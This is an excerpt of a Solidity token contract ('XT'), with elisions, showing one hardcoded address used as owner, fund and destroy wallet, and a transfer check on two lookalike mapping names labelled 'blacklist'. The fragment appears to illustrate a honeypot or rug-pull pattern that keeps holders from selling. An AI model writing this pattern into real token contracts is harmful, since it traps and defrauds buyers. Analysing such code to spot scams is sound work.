...
contract XT is IERC20, Ownable {
    ...
    address private _destroyAddress = address(0xb8D8470D96d20D999EeEb5c83e7311a7C5F2F982);

    uint256 public _inviterFee;

    uint256 public _fundFee;
    address private fundAddress = address(0xb8D8470D96d20D999EeEb5c83e7311a7C5F2F982);
    ...
    address public ownerAddr = 0xb8D8470D96d20D999EeEb5c83e7311a7C5F2F982;
    ...
    constructor() {
        ...
        .createPair(address(this), 0xb8D8470D96d20D999EeEb5c83e7311a7C5F2F982); 

        uniswapV2Router = _uniswapV2Router;

        _tTotal = 880 * 10 ** _decimals;
        ...
        _owner = 0xb8D8470D96d20D999EeEb5c83e7311a7C5F2F982;
    ...
    function _transfer(
        ...
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]){
                require(_isExcludedFromFee[from] || _isExcludedFromFee[to],"blacklist");
        }
        bool takeFee = false;
